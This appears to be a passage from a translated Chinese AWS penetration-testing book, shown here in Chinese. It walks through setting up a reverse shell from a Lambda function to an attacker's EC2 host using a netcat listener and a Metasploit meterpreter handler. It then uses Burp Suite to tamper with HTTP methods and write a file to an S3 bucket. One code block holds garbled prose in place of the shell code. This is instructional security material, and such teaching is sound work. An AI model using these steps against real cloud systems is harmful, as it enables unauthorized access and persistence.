1.  从这里开始，我们将点击**创建函数**按钮开始：![图 7.6 - 创建另一个函数](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_7.06_B15630.jpg)

图 7.6 - 创建另一个函数

1.  登录后，创建一个名为`LambdaShell`的新函数，并确保选择**Python 2.7**。我们创建的角色将适用于此示例：![图 7.7 - 为反向 shell 创建函数](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_7.07_B15630.jpg)

图 7.7 - 为反向 shell 创建函数

1.  现在是时候开始设置我们的函数，以创建与 EC2 实例的反向连接。我设置了一个 GitHub 存储库，我们可以从中拉取代码：[`github.com/PacktPublishing/AWS-Penetration-Testing/blob/master/Chapter%207:%20Assessing%20and%20Pentesting%20Lambda%20Services/Lambda_Shell.txt`](https://github.com/PacktPublishing/AWS-Penetration-Testing/blob/master/Chapter%207:%20Assessing%20and%20Pentesting%20Lambda%20Services/Lambda_Shell.txt)。

您放入的代码应该如下所示：

```
lambda_handler that will execute a connection from the Lambda function to our attacker machine. Note that, when we call s.connect, we need to put our public DNS in the code where it says hostname. Once the function is executed, it will initiate a connection back to our machine and execute a Bash shell on the target Lambda function.Make sure that you designate a **port** to use and that the **hostname** is set to the public DNS name of your attacker machine on your EC2 instance. You can see what the public DNS name is by looking at the description for your Kali EC2 instance, which can be found on the EC2 dashboard.
```

1.  接下来，我们需要确保函数不会太快超时。默认情况下，函数应该在大约 3 秒后超时。我们需要建立持久性，所以可以将超时设置为大约`5`分钟 - 如果需要，可以设置更长时间：

重要提示

Lambda 函数允许的最长时间为`15`分钟。

![图 7.8 - 设置 shell 超时](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_7.08_B15630.jpg)

图 7.8 - 设置 shell 超时

1.  接下来，您需要 SSH 到您的 Kali 机器，并设置一个`su -`命令，在每个命令之前切换到`sudo`，因为您将以 root 帐户运行。

1.  下一个命令设置了我们将用于**监听**来自目标**Lambda 服务**的传入连接的**netcat**监听器：

```
$ nc -lvnp 1337
```

1.  我们应该让我们的监听器待命，准备好测试我们的功能。现在是我们获得反向 shell 并在 Lambda 环境中获得一些持久性的时候了。要执行，请点击右上角的**测试**按钮。您将看到一个显示**配置测试事件**的窗口 - 继续点击**创建**，然后再次点击**测试**。请注意，在点击**测试**之前，您将获得一个具有三个键的事件模板。将它们保留为默认值：![图 7.9 - 在执行函数之前配置测试事件](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_7.09_B15630.jpg)

图 7.9 - 在执行函数之前配置测试事件

1.  点击**测试**按钮后，您将看到函数在仪表板中运行。现在回到您在 Kali 机器上的终端。您将在 Lambda 实例上收到一个反向连接！随时在您的 shell 中运行一些 Linux 命令：

![图 7.10 - 获取反向 shell](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_7.10_B15630.jpg)

图 7.10 - 获取反向 shell

看吧！我们可以始终访问 Lambda 环境！虽然这是一个很酷的有趣的例子，但我们需要了解一些潜在的问题，以及为什么在渗透测试期间我们会记录这些。假设我们正在测试 Lambda 环境的弱策略。策略不应该允许渗透测试人员执行超出 Lambda 环境的调用 - 记住，我们去了一个公共 DNS，这意味着我们走出了 VPC！

好的，所以我们之前在 AWS 控制台的 GUI 中完成了所有这些操作，这很有趣也很酷。让我们快速看一下更实用的方法 - 使用 AWS CLI。我们将假设凭据已被泄露，并且该函数已经准备好供我们使用。

## 使用 AWS CLI 调用

现在我们的函数已经在环境中，让我们看看如何只使用托管在我们的公共 EC2 实例上的 Kali Linux 机器来实现持久性。首先，确保您通过 SSH 登录到 Kali，并通过在命令的末尾加上`&`来在后台运行`netcat`。在后台运行命令可以让您仍然使用终端：

```
$ nc -lvp 1337 &
```

现在你的监听器已经在后台设置好并准备就绪。在执行连接之前，我们需要配置到 AWS 环境。在终端中键入`aws configure`，确保使用我们在之前章节中使用的 ID 和密钥。一旦设置到环境中，运行以下命令来启动 shell：

```
$ aws lambda invoke --function-name <<Lambda ARN>> --invocation-type RequestResponse outfile.txt --region <<aws region>>
```

重要提示

您可能需要在您的 Kali 实例上安装 AWS CLI。要安装 AWS CLI，请运行以下命令：`$ apt-get install awscli -y`。

正如你所看到的，在 Lambda 中获取 shell 可能很有趣，但对于毫无戒心的企业来说也可能很危险。对抗这种情况的一个很好的方法是在网络中部署监控解决方案 - 诸如网络预防和检测系统之类的设备，这些设备具有检测网络中的异常流量的出口规则，以及检查进入的数据包的入口规则。在 AWS 方面，**CloudTrail**是在尝试检测与 AWS 环境之间的流量时使用的一个很好的资源。

在本书中我们已经谈论了很多关于 Metasploit，现在让我们看看如何在 Lambda 中使用 Metasploit。我们将看看如何利用 Metasploit 中的处理程序来捕获会话。

重要提示

会话是在 Metasploit 中被挂钩的连接。

## 使用 Metasploit 和 Lambda 玩得开心

现在我们了解了如何使用 Python 和 Lambda 创建 shell 脚本，让我们看看如何使用 Metasploit 来获得类似的结果！在这个练习中，我们可以使用之前的相同有效载荷；但是，如果您重新启动了实例或者使用了不同的 EC2，您可能需要更改您的实例 DNS 名称。

在开始之前，让我们讨论一下我们将要做什么；记住，最好在执行计划之前制定计划，即使这个计划很小！例如，我们需要使用`netcat`建立连接。我们在设置 Lambda 函数的反向 shell 时学习了`netcat`。

由于我们之前在*第三章**，探索渗透测试和 AWS*中使用过 Metasploit，所以不需要讨论 Metasploit 或如何启动它。但是，我们需要确保使用正确的有效载荷。以下步骤将展示如何使用 Python 有效载荷设置处理程序，以捕获我们的脆弱 Lambda 函数的连接。

启动 Metasploit 并输入以下命令开始设置处理程序：

```
$ use exploit/multi/handler 
$ set payload python/meterpreter/reverse_tcp
$ set lhost <<EC2 instance DNS>>
$ set lport 1337
$ run 
```

一旦您开始运行处理程序，您的处理程序将进入`netcat`工作，除了我们使用 Meterpreter 来解释我们的 shell 和`netcat`连接中使用的默认 Bash shell 之外。Meterpreter shell 比`netcat`连接更强大，因为它们提供了大量的模块，您可以在 Meterpreter shell 中加载这些模块。我们将在*第九章**，使用 Metasploit 进行真实渗透测试和更多内容*中了解更多。

现在我们的监听器正在运行，回到您的易受攻击的 Lambda 函数并测试它，尝试连接到您的 Meterpreter 监听器。如果一切顺利，您将拥有一个分段器，然后是一个会话。您的会话是与目标的交互式 shell：

![图 7.11-通过 Meterpreter 获取反向 shell](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_7.11_B15630.jpg)

图 7.11-通过 Meterpreter 获取反向 shell

现在，在我们的 Lambda 实例上通过 Meterpreter 拥有了一个交互式 shell。如果此 Lambda 实例正在连接其他资源，则可能存在转向的可能性-但是在本示例中，我们不会过多担心这一点。在*第九章**，使用 Metasploit 进行真实渗透测试和更多内容*中将更多地涉及转向。目前，可以随意移动您的 shell，尝试不同的有效载荷，甚至扩展您的环境，看看您还能做些什么！

在书的这一部分中做得很好！本章着重介绍了一些在渗透测试中使用的新技术，您还学会了如何在 Lambda 上获取反向 shell！

# 摘要

在本章中，我们看了如何在 AWS 中创建 Lambda 函数以及它们的功能。我们还研究了 Lambda 的易受攻击问题以及这些问题可能给未能隔离这些问题的组织带来的漏洞。创建反向 shell 有助于我们了解如果易受攻击的 Lambda 函数出现在环境中会出现什么严重问题。

在下一章中，我们将开始研究如何攻击 AWS API，并查看它们如何处理请求，以及讨论用于保护它们的技术。

# 进一步阅读

+   交互式 Lambda shell：[`www.lambdashell.com/`](http://www.lambdashell.com/)

+   Metasploit 处理程序：[`www.rapid7.com/db/modules/exploit/multi/handler`](https://www.rapid7.com/db/modules/exploit/multi/handler)


# 第八章：评估 AWS API Gateway

AWS API Gateway 充当了可以托管各种类型数据的应用程序的门户。它们托管的数据各不相同；然而，有一点是一样的，即一些数据可能被未经授权的人员视为有吸引力 - 例如 S3 存储桶的位置或过于宽松的标头。本章将讨论 AWS API Gateway 是什么，以及您如何学习使用开源工具检查 API 调用和操纵 API 调用。

了解 AWS API 的工作原理将使我们的思维模式从 Linux 终端扩展到浏览器，并了解 Web 服务的基础知识以及如何与其交互。在阅读本章的过程中，请记住，其中的许多技术也可以评估 AWS 中的所有 Web 应用程序。本章旨在让您全面了解 AWS API 以及如何通过操纵 API 调用来评估 Web 应用程序。

在本章中，我们将涵盖以下主题：

+   探索和配置 AWS API

+   使用 AWS 创建我们的第一个 API

+   使用 Burp Suite 入门

+   使用 Burp Suite 检查流量

+   操纵 API 调用

# 技术要求

+   Burp Suite: [`portswigger.net/burp/communitydownload`](https://portswigger.net/burp/communitydownload)

查看以下视频以查看代码的实际操作：[`bit.ly/3kPr2sb`](https://bit.ly/3kPr2sb)

# 探索和配置 AWS API

您是否曾经想过信息是如何从您的计算机发送到网站或该网站的后端服务器的？通常情况下，您的请求是从浏览器发送的，然后通过称为**应用程序编程接口**（**API**）的东西进行。API 是一个接口，用于允许其他应用程序或主机与一个中心点进行交互。在这种情况下，API 是中心点，而应用程序将是我们在 AWS 中与之交互的服务。

那么，这对于 AWS 意味着什么，我们将如何通过本书来使用它？首先，我们需要了解亚马逊 API 的基本术语以及亚马逊 API 网关如何管理服务。我们将通过查看 AWS 环境中 API 的高级视图来了解这一点，然后学习如何拦截和操纵 API 请求，就像在现实的渗透测试中一样。

AWS API Gateway 是一个托管服务，提供了一个**前门**，允许您访问各种 AWS 服务上的应用程序和数据。网关处理涉及接受和处理 API 请求的所有任务。API 还在身份验证和授权控制中发挥关键作用，这在安全方面起着至关重要的作用。如果有人能够绕过身份验证和授权机制，他们将能够直接访问被攻击的服务或资源。

在我们开始查看 API 的高级地图以及它们如何与我们的 AWS 环境配合工作之前，我们需要了解 AWS 提到的两种 API 类型。我们将讨论的两种 API 是**RESTful APIs**和**WebSocket APIs**。

## RESTful APIs

REST 实际上是**REpresentational State Transfer**的首字母缩写。RESTful API 设计使我们能够进行所谓的无状态调用或无状态请求。这种无状态请求允许在发生故障时重新部署调用，并且在需要时也可以进行扩展。这个功能使得 RESTful API 在云应用中相当受欢迎，比如 AWS，因为无状态 API 的扩展可以很容易地与敏捷扩展的云环境集成。由于它们的敏捷性，RESTful API 可以根据流量负载快速进行调用和更改，而不会变得不堪重负。

重要提示

关于 API 的信息远远超出了本书中的材料。如果您想了解更多关于 RESTful API 的信息，请查看 AWS 文档：[`docs.aws.amazon.com/apigateway/api-reference/`](https://docs.aws.amazon.com/apigateway/api-reference/)。

现在我们对 RESTful API 有了更多的了解，让我们简要提一下另一种类型的 API：WebSocket API。

## WebSocket API

WebSocket API 网关是集成了各种路由和各种服务（如 Lambda 函数和 HTTP 端点）的集合。WebSocket API 是双向的，并确保终端客户端可以将流量发送到服务并从服务发送通信回客户端。

重要提示

双向基本上意味着流量可以在两个不同的方向上运行。

由于它们的多功能性和双向功能，WebSocket API 通常用于运行实时流媒体频道的应用程序，例如游戏、华尔街使用的金融交易平台和聊天应用程序 - 其中一些您可能用来与朋友和家人交谈！

现在我们已经了解了 API 是什么以及它们是如何工作的，我希望我们开始更多地应用一些实际的知识来帮助将所有内容完整地连接起来。然而，在我们开始之前，让我们快速地看一下 API 在 AWS 中如何工作，并与虚拟私有云（VPC）和 EC2 实例进行交互的高级概述。

## API 地图概述

本节将简要说明 API 如何与 VPC 中的 Lambda 函数和 EC2 实例配合工作的高级视图。运行 API 并将其与各种服务集成的优势在于可以通过 Web 流量门户（在本例中为 API）扩展多个服务，并从 API 中集中记录所有内容。正如前面提到的，API 允许快速高效地进行扩展 - 因此将它们作为访问多个服务的主要门户将使您能够构建更多从一个中央 API 查询的服务。

现在让我们看一个简单的解决方案，创建一个允许您访问 Lambda 函数和 EC2 实例的 API。在这个例子中，我们不担心服务在做什么。我们更关心的是理解流量如何从 Amazon API 网关流向服务，以及从服务返回到 API。

查看以下插图，以帮助您了解与 AWS 服务一起使用 API 的过程：

![图 8.1 - AWS API 网关图](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.01_B15630.jpg)

图 8.1 - AWS API 网关图

从图表中可以看出，外部用户正在尝试通过 API 访问服务。请记住，API 使用 Web 请求调用来发布和检索信息。 **Amazon API Gateway** 根据用户的请求向 **Lambda 函数** 或 **EC2 实例** 发出调用。然后服务将数据发送回外部用户。这完成了用户和服务之间的流量流动。

重要提示

在本章后面的部分中，我们将更多地了解 Web 请求在操作 API 调用时的情况。

现在我们对 API 是什么以及它如何与 AWS 服务配合工作有了很好的理解，让我们继续制作我们自己的 API。

# 使用 AWS 创建我们的第一个 API

本节将简要但简洁地介绍如何在 AWS 中设置自己的 API。我们不会担心将任何服务连接到它 - 我们将在以后的练习中检查流量并将调用传递到 API 时再进行连接。

以下是指导您创建一个可以在本章中使用的 API 的说明。要开始，请登录 AWS 控制台并按照以下步骤操作：

1.  在 AWS 控制台的主菜单中的搜索栏中搜索`api`服务：![图 8.2 - 搜索 api](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.02_B15630.jpg)

图 8.2 - 搜索 api

1.  接下来，您将获得一个 API 列表可供选择。选择**REST API**并点击**构建**：![图 8.3 – 构建 API](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.03_B15630.jpg)

图 8.3 – 构建 API

1.  现在您需要配置 API。确保选择`PentestPacktAWS`。您可以随意命名您的 API，但请确保记住名称。提供描述是可选的，但是是一个好习惯，特别是当您开始构建更多的 API 时 - 它将帮助您记住每个 API 的目的：![图 8.4 – 命名 API](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.04_B15630.jpg)

图 8.4 – 命名 API

1.  输入完所有信息后，点击**创建 API**完成。

点击**创建 API**后，您将进入 API 的主要仪表板。这是我们将在本章后面配置 API 的地方。现在，可以随意熟悉面板。

现在我们已经学会了如何创建 API，下一个合乎逻辑的步骤是了解我们将用来评估 API 的工具。本章的下一部分将重点介绍一种名为 Burp Suite 的流行网络工具。

# 开始使用 Burp Suite

本章的这一部分将讨论本书尚未使用的工具。我们将使用的工具是一种代理工具，它允许我们对 Web 应用程序进行安全测试，在我们的情况下，它将使我们能够拦截发送到和从我们的 AWS API 目标的请求。这意味着 Burp Suite 将使我们完全控制通过我们的 Web 浏览器发送的请求，使我们能够操纵对 API 的调用。

重要提示

代理是在发送到目标之前检查和分析流量的服务器或服务。

拦截 API 的调用允许我们查看诸如令牌、会话和其他可能能够被更改以使 API 接受不应该接受的调用的参数。这是漏洞赏金猎人和网络应用程序渗透测试人员常用的技术。

重要提示

漏洞赏金猎人是一名自由渗透测试人员，与公司合作测试其网站上的漏洞。这些漏洞是通过第三方服务报告的，称为漏洞赏金计划。在这里了解更多关于漏洞赏金计划：[`whatis.techtarget.com/definition/bug-bounty-program`](https://whatis.techtarget.com/definition/bug-bounty-program)。

在接下来的部分中，我们将登录到本地的 Kali Linux 机器，并启动 Burp Suite 并将其配置到我们的 Web 浏览器。一旦设置好，我们将拦截一些不同的请求并检查各种 Web 请求，以更多地了解如何使用该工具。

## 配置 Burp Suite

现在我们更了解 Burp Suite 是什么，让我们继续实际动手并开始使用该应用程序。在开始之前，您需要在 VirtualBox 中启动本地的 Kali Linux 机器。一旦机器启动并运行，登录到 Kali Linux 机器。

登录后，使用以下步骤启动 Burp Suite：

1.  启动终端并输入`burpsuite`。

1.  一旦打开 Burp Suite，您需要选择**临时项目**：![图 8.5 – 新的 Burp 项目](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.05_B15630.jpg)

图 8.5 – 新的 Burp 项目

1.  选择**使用 Burp 默认值**：![图 8.6 – 使用 Burp 默认值](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.06_B15630.jpg)

图 8.6 – 使用 Burp 默认值

1.  接下来，转到**代理**选项卡，并找到**选项**部分：![图 8.7 – 配置接口](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.07_B15630.jpg)

图 8.7 – 配置接口

1.  您需要确保将接口配置为本地地址`127.0.0.1`，并将端口设置为`8080`。Burp Suite 默认已配置好，但是如果不是这样 - 您可以配置 Burp Suite 以满足上一个截图的规格。

很好，现在我们已经设置好了 Burp Suite 绑定到我们的本地主机的`8080`端口。这意味着通过我们的本地主机发送到`8080`端口的任何流量都将被 Burp Suite 捕获。

我们还没有完成，现在我们需要配置我们的浏览器，以便将流量通过我们分配的本地主机上的指定端口。

要开始，请在您的 Kali Linux 机器中打开 Firefox：

1.  打开终端，输入`firefox`并按下**Enter**。

1.  接下来，点击浏览器右上角的选项，选择**首选项**：![图 8.8 - 浏览器配置](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.08_B15630.jpg)

图 8.8 - 浏览器配置

1.  接下来，在**首选项**部分的搜索栏中键入`代理`。点击**设置...**继续：![图 8.9 - 配置 web 代理](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.09_B15630.jpg)

图 8.9 - 配置 web 代理

1.  确保`8080`。确保选择**为所有协议使用此代理服务器**。这将允许加密流量通过。完成后点击**确定**：

![图 8.10 - 设置代理参数](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.10_B15630.jpg)

图 8.10 - 设置代理参数

干得好，您已成功配置浏览器以与 Burp Suite 配合使用。从现在开始，我们将开始使用 Burp Suite 拦截本章剩余部分的 web 请求。但是，在开始之前，我们需要在浏览器上安装 Burp Suite 证书。重要的是，我们有能力拦截流量，以便我们可以看到通过我们的浏览器传输的未加密和加密流量。

要安装 Burp Suite 证书，请按照以下步骤进行：

1.  在配置好并运行 Burp Suite 后，在浏览器中输入以下网址：

[`burp`](http://burp)

1.  您将在右上角看到一个横幅，上面写着**CA 证书**。点击它：![图 8.11 - Burp 证书](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.11_B15630.jpg)

图 8.11 - Burp 证书

1.  保存文件。

1.  返回到`证书`。点击**查看证书...**：![图 8.12 - 查看证书](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.12_B15630.jpg)

图 8.12 - 查看证书

1.  接下来，您将看到**证书管理器**。在这里，您需要导入我们刚刚从 Burp Suite 下载的证书。要做到这一点，点击**导入...**：![图 8.13 - 导入证书](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.13_B15630.jpg)

图 8.13 - 导入证书

1.  导入我们刚刚下载的`cacert.der`文件。

1.  勾选**信任 CA 以识别网站**和**信任 CA 以识别电子邮件用户**。完成后点击**确定**：

![图 8.14 - 导入证书继续](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.14_B15630.jpg)

图 8.14 - 导入证书继续

就是这样！现在我们正式准备拦截一些 web 请求！在本书中或现实生活中使用 Burp Suite 时，请确保在使用前打开代理，在使用后关闭代理！如果不关闭代理，可能会在使用 web 浏览器时遇到一些问题。

重要提示

如果您仍然在使用 Burp Suite 应用程序时遇到问题，请查看帮助指南以解决常见问题：[`portswigger.net/burp/documentation/desktop/getting-started/proxy-troubleshooting`](https://portswigger.net/burp/documentation/desktop/getting-started/proxy-troubleshooting)。

# 使用 Burp Suite 检查流量

接下来的部分将介绍如何检查我们刚刚创建的 REST API 的流量。使用 Burp Suite 检查流量对于网络渗透测试和 web 应用程序渗透测试至关重要，因为它允许我们查看特定连接上的所有通信。虽然我们不会担心网络拦截，但我们将使用许多在 web 应用程序渗透测试中使用的相同技术。

在我们开始检查流量之前，我们需要确保在开始之前进行一些快速的清理工作。我们需要确保我们也部署了我们的 AWS API 网关，这样我们才能学习如何拦截来自 REST API 的流量。

## 部署 API 网关

要开始，请重新登录 AWS 控制台并转到本章开头创建的 API：

![图 8.15 – 选择我们的 API](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.15_B15630.jpg)

图 8.15 – 选择我们的 API

点击 API 以访问网关开始。

一旦您进入 AWS API 的主配置屏幕，您需要选择**操作**。这将弹出一个菜单，其中有创建方法、删除 API 的选项，最重要的是创建方法和部署 API 的选项。以下步骤将帮助您完成部署 API 的指导：

1.  点击**操作**：![图 8.16 – 选择操作](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.16_B15630.jpg)

图 8.16 – 选择操作

1.  选择**创建方法**。

1.  选择**ANY**作为操作。

1.  选择**模拟**作为集成类型：![图 8.17 – 创建模拟方法](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.17_B15630.jpg)

图 8.17 – 创建模拟方法

1.  点击**保存**。

很好，现在我们有一个可以用来调用 API 的方法。既然我们有了一个方法，我们可以继续部署我们的 API 并使其可访问。接下来的步骤将帮助我们部署 API：

1.  点击**操作**。

1.  接下来，选择**部署 API**：![图 8.18 – 部署 API](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.18_B15630.jpg)

图 8.18 – 部署 API

1.  选择**[新阶段]**作为**部署阶段**。

1.  对于阶段名称，使用**prod**：![图 8.19 – 配置阶段名称](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.19_B15630.jpg)

图 8.19 – 配置阶段名称

1.  最后，点击**部署**。

点击**部署**后，您会注意到在您的 AWS API 仪表板顶部会有一个横幅。横幅上会显示**调用 URL**。您应该看到一个网址，看起来像以下截图中的样子：

![图 8.20 – API 横幅](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.20_B15630.jpg)

图 8.20 – API 横幅

该网址是您新部署的 AWS API 的网址，将用于测试下一节中拦截流量。请注意，您的 API 地址将与此示例中的网址不同。

接下来，让我们继续拦截我们新部署的 AWS API 上的一些流量。

## 实际操作拦截 API 调用

现在是一些有趣的、实际操作的内容。现在我们将从清理部分转移到一些实际操作的练习，以帮助您使用 Burp Suite。在继续之前，请确保您已经配置了 Burp Suite 和您的浏览器以拦截 Web 流量。如果需要复习，请参考*配置 Burp Suite*部分。

使用正确配置的 Burp Suite 和您的 Web 浏览器，让我们开始吧：

1.  打开您的浏览器，将 API 网址放入地址栏并点击*Enter*。查看前一节的*步骤 5*，以了解如何**调用 URL**的提醒。

1.  您的 Burp Suite 应用程序应该弹出一个**拦截**窗口：![图 8.21 – GET 请求](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.21_B15630.jpg)

图 8.21 – GET 请求

1.  这里发生的是我们正在拦截主机和服务器之间的通话。注意`GET`参数后面跟着`/prod`。这意味着我们正在尝试检索`prod`目录。

1.  继续，点击**转发**将请求发送到服务器：![图 8.22 – 转发请求后的 Web 浏览器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.22_B15630.jpg)

图 8.22 – 转发请求后的 Web 浏览器

1.  如您所见，我们有一个空白屏幕 – 这完全没问题。因为页面呈现为空白，没有**未找到**横幅，我们知道 URL 有效。

我们现在成功地拦截了主机机器和 AWS API 之间的数据包。虽然这可能看起来很基础，但在我们开始操作 API 调用之前，我们必须了解 Burp Suite 拦截 Web 流量的基础知识。如果我们跳过了解如何设置我们的环境并理解基本的拦截，我们就无法真正理解正在发生的确切过程。

接下来，我们将继续进行本章的最后一部分。我们将学习更多关于 HTTP 方法的知识，并通过构建我们迄今所学的一切来学习如何操作 API 调用。

# 操作 API 调用

在开始之前，我们需要了解可以用来操作 API 调用的基本 HTTP 方法。HTTP 请求方法本质上是您想要在目标 API 上执行的操作。通常称为 HTTP 动词，这些方法可以允许我们向目标资源放置数据和检索数据或信息。下一部分将简要介绍这些方法。

`GET`方法从特定地址请求资源。使用`GET`的请求应该只检索数据。`HEAD`方法要求一个等同于`GET`请求的确认，只是没有确认主体。`DELETE`方法用于删除指定的资源。`POST`方法用于向目标资源提交数据 - 通常，您会看到`POST`方法用于发布数据并引起问题。`PUT`方法用于在目标服务器上放置数据。

现在我们了解了 HTTP 方法是什么以及它们是如何工作的，让我们看看它们的实际应用。对于下一个示例，我们将运行一个练习，通过操作调用一个易受攻击的 S3 API。如果您需要复习如何创建 S3 存储桶，请参考*第四章**，利用 S3 存储桶*。

重要提示

要了解有关为 S3 创建 API 的更多信息，请参考此资源：[`aws.amazon.com/s3/features/access-points/`](https://aws.amazon.com/s3/features/access-points/)。您需要在其中创建一个自己的测试文件夹的存储桶，以执行下一个练习。

## 玩转修改 HTTP 方法

对于下一部分，我们将通过 AWS API 来定位一个 S3 存储桶。存储桶位于[`awspublicpackt.s3.amazonaws.com/`](https://awspublicpackt.s3.amazonaws.com/)。让我们继续在 Burp Suite 中拦截它：

1.  使用 Burp Suite 和已配置为拦截 Web 流量的浏览器，在 URL 栏中输入地址：![图 8.23 - Burp 请求](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.23_B15630.jpg)

图 8.23 - Burp 请求

1.  如您所见，我们正在基于`host`参数拦截 API 调用。我们正在使用`GET`方法，这意味着我们正在检索资源。点击**前进**继续：![图 8.24 - 查看存储桶对象和密钥](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.24_B15630.jpg)

图 8.24 - 查看存储桶对象和密钥

1.  如您所见，有一个名为`TestAPI.txt`的目录。接下来，让我们继续拦截`test`目录，并查看是否可以查看文本文件：![图 8.25 - 检索 TestAPI.txt](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.25_B15630.jpg)

图 8.25 - 检索 TestAPI.txt

1.  点击**前进**：![图 8.26 - TestAPI.txt 的输出](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.26_B15630.jpg)

图 8.26 - TestAPI.txt 的输出

1.  请注意，文本文件的内容正在显示。这意味着我们有读取权限。接下来，让我们看看是否可以通过操作 API 在存储桶中放置一个对象。让我们使用`PUT`方法将`HackedAPI.txt`测试文件放入`i love pentesting`数据到文本文件中：![图 8.27 - 通过操作 API 调用放置数据](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.27_B15630.jpg)

图 8.27 - 通过操作 API 调用放置数据

1.  现在，为了确认我们已经将数据放在目标上，我们可以在终端中使用`curl`命令来检查并查看数据是否已存储。我们使用以下命令来验证数据是否已放入 S3 存储桶：

```
$ curl https://awspublicpackt.s3.amazonaws.com/test/Hacked.txt
```

我们看到以下输出：

![图 8.28 – 成功的数据上传](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_8.28_B15630.jpg)

图 8.28 – 成功的数据上传

1.  正如我们所看到的，通过操纵 API 中的调用，我们已成功将数据放入了 S3 存储桶。接下来，让我们看看是否可以删除`/test`合法资源。

正如您所看到的，我们能够通过操纵 HTTP 请求中的方法来操纵我们的主机和资源之间的调用。根据我们刚刚进行的练习，我们能够通过操纵 HTTP 调用来读取和写入资源的数据。这是非常危险的，因为如果被发现，攻击者可能会留下恶意软件或窃取敏感信息。非常重要的是要建立适当的访问控制，以确保资源不会被留下不安全。

现在让我们继续，结束本章，并开始着手下一部分的内容，*第九章**，使用 Metasploit 和更多进行真实的渗透测试！*

# 摘要

在本章中，我们了解了与 AWS 中的 API 和网关相关的 Web 流量和 Web 请求。我们学会了部署简单的 API 网关，还学会了使用评估 API 和网关的重要工具–Burp Suite。我们进行了一个有趣的练习，演示了如何使用 Burp Suite 来操纵 HTTP 请求，并提到了留下 API 易受攻击的危险。有了这些知识，您现在可以使用本章学到的方法对基于 Web 的应用程序和服务进行攻击和评估。

在下一章中，我们将通过更多的实践经验来进一步了解 AWS。这是本书中最长的一章，将让您建立新的环境并根据场景进行利用，最终教会您 AWS 渗透测试的技术部分和相关流程。

# 进一步阅读

+   漏洞赏金计划列表：[`www.bugcrowd.com/bug-bounty-list/`](https://www.bugcrowd.com/bug-bounty-list/)

+   WebSocket API: [`docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-websocket-api.html`](https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-websocket-api.html)

+   从轮询到推送：使用 Amazon API Gateway REST API 和 WebSockets 转换 API：[`aws.amazon.com/blogs/compute/from-poll-to-push-transform-apis-using-amazon-api-gateway-rest-apis-and-websockets/`](https://aws.amazon.com/blogs/compute/from-poll-to-push-transform-apis-using-amazon-api-gateway-rest-apis-and-websockets/)


# 第九章：使用 Metasploit 和更多工具进行真实渗透测试！

到目前为止，我们已经看过各种服务是如何设置的，以及我们如何修改和利用它们 - 同时也讨论了如何建议修复它们的简单解决方案。现在我们将会有相当大的进展，并将应用我们的渗透测试知识。我们将使用 AWS 和诸如 Metasploit 之类的工具来帮助我们利用 AWS 环境中的漏洞。本章将采用真实生活中的方式，来演示如何在真实世界的环境中进行 AWS 环境的渗透测试。

我们将进行一些基本的系统设置，模仿常见的漏洞，以及查看我们在之前章节中设置的一些镜像。我们将运行一些你可能会遇到的真实渗透测试场景，以及一些有趣的练习，教你一些新的策略和技术。我们将通过探索 Metasploit 中的一些 AWS 模块来结束本章，这些模块允许我们枚举敏感信息，从而导致进一步的攻击和权限提升。

把这一章看作是之前所有章节的“技术”顶峰。

在本章中，我们将涵盖以下主题：

+   使用 Metasploit 进行真实渗透测试

+   渗透测试前期准备

+   针对 WordPress 进行利用

+   针对易受攻击的服务应用

+   探索 AWS Metasploit 模块

# 技术要求

以下是本章的技术要求：

+   Metasploit

+   Nmap

+   WordPress

+   EC2 实例

+   虚拟私人云

